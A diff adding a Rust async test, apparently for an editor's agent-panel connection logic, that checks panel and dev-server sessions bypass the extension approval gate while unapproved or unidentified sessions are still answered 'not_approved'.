+#[gpui::test]
+async fn hostile_a_panel_and_a_dev_server_never_get_not_approved_but_an_unapproved_extension_does(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let (announce, panel) = connect_panel("/p/app", 1, &app, cx);
+
+    for (n, (kind, extra)) in every_panel_request().into_iter().enumerate() {
+        for (who, session) in [("panel", &panel), ("dev_server", &announce)] {
+            let rid = format!("{who}-{n}");
+            session.handle(request(kind, &rid, extra.clone()), &app.app_state(), cx);
+            let answer = reply(&session.drain(cx), &rid);
+            assert_ne!(
+                answer["error"], "not_approved",
+                "B4: a {who} session never reaches the extension's approval path ({kind}): {answer}"
+            );
+        }
+    }
+    assert!(
+        !panel.closed() && !announce.closed(),
+        "R9.3: both sessions kept"
+    );
+
+    // Converse: the extension's gate is unchanged — an extension still waiting for approval, and
+    // a session that has said no hello at all, are still answered `not_approved`.
+    let pending = open_session(10);
+    pending.handle(hello("chrome", "never-approved"), &app.app_state(), cx);
+    pending.drain(cx);
+    pending.handle(
+        request("list_threads", "l", json!({})),
+        &app.app_state(),
+        cx,
+    );
+    assert_eq!(
+        reply(&pending.drain(cx), "l")["error"],
+        "not_approved",
+        "R4.5 (045): an unapproved extension is still gated"
+    );
+    let silent = open_session(11);
+    silent.handle(
+        request("list_threads", "l", json!({})),
+        &app.app_state(),
+        cx,
+    );
+    assert_eq!(
+        reply(&silent.drain(cx), "l")["error"],
+        "not_approved",
+        "no hello is no kind: not a panel, so still gated"
+    );
+}
